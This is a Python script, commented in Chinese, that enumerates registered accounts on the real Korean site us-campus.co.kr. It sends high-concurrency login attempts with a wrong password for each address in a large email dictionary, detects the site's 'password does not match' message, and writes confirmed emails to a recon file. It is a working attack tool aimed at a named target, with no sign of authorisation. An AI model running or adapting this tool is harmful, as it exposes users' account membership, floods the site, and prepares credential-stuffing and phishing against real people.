#!/usr/bin/env python3
"""
us-campus.co.kr 高速邮箱枚举 (滑动窗口全速版)
用法: python3 fast_email_enum.py [--dict 字典] [--concurrency 250] [--limit N]
"""
import asyncio
import aiohttp
import argparse
import json
import time

BASE = "https://us-campus.co.kr"
H = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
HIT_LOGIN = "비밀번호가 일치"


async def check(email: str, session: aiohttp.ClientSession, sem: asyncio.Semaphore):
    async with sem:
        try:
            async with session.post(
                f"{BASE}/login/login",
                data={"email": email, "password": "WrongPass123!"},
                headers=H,
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=8, connect=3),
            ) as resp:
                text = await resp.text()
                if HIT_LOGIN in text:
                    return {"email": email, "status": "registered", "via": "login"}
        except Exception:
            pass
    return None


async def run(emails: list, concurrency: int, report_every: int = 5000):
    sem = asyncio.Semaphore(concurrency)
    conn = aiohttp.TCPConnector(
        limit=concurrency + 20,
        limit_per_host=concurrency + 20,
        ssl=False,
        ttl_dns_cache=600,
        enable_cleanup_closed=True,
    )
    hits = []
    done = 0
    total = len(emails)
    t0 = time.time()
    last_report = 0

    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = [asyncio.create_task(check(e, session, sem)) for e in emails]
        for coro in asyncio.as_completed(tasks):
            r = await coro
            if r:
                hits.append(r)
                print(f"[HIT] {r['email']}", flush=True)
            done += 1
            if done - last_report >= report_every or done == total:
                elapsed = time.time() - t0
                rate = done / elapsed if elapsed else 0
                print(
                    f"[进度] {done:,}/{total:,} ({100*done/total:.1f}%) "
                    f"命中={len(hits)} 速度={rate:.0f}/s",
                    flush=True,
                )
                last_report = done

    return hits, time.time() - t0


def load_dict(path: str) -> list:
    emails = []
    with open(path) as f:
        for line in f:
            e = line.strip().lower()
            if e and "@" in e and not e.startswith("#"):
                emails.append(e)
    return list(dict.fromkeys(emails))


def main():
    parser = argparse.ArgumentParser(description="us-campus 邮箱高速枚举")
    parser.add_argument(
        "--dict",
        default="/workspace/us-campus-recon/dict/emails_kr_large.txt",
    )
    parser.add_argument("--concurrency", type=int, default=250, help="并发(推荐200-250)")
    parser.add_argument(
        "--out",
        default="/workspace/us-campus-recon/dict/enum_hits.json",
    )
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--report-every", type=int, default=5000)
    args = parser.parse_args()

    emails = load_dict(args.dict)
    if args.limit:
        emails = emails[: args.limit]
    print(f"字典: {args.dict}")
    print(f"邮箱数: {len(emails):,}  并发: {args.concurrency}")
    print("接口: POST /login/login | 模式: 滑动窗口全速")
    print("-" * 50)

    hits, elapsed = asyncio.run(run(emails, args.concurrency, args.report_every))

    result = {
        "target": BASE,
        "dict": args.dict,
        "scanned": len(emails),
        "hits": hits,
        "hit_count": len(hits),
        "elapsed_sec": round(elapsed, 1),
        "rate_per_sec": round(len(emails) / elapsed, 1) if elapsed else 0,
    }
    with open(args.out, "w") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    print("-" * 50)
    print(f"完成: 扫描 {len(emails):,}  命中 {len(hits)}  耗时 {elapsed:.0f}s  速度 {result['rate_per_sec']}/s")
    print(f"结果: {args.out}")
    if hits:
        for h in hits:
            print(f"  {h['email']}")


if __name__ == "__main__":
    main()
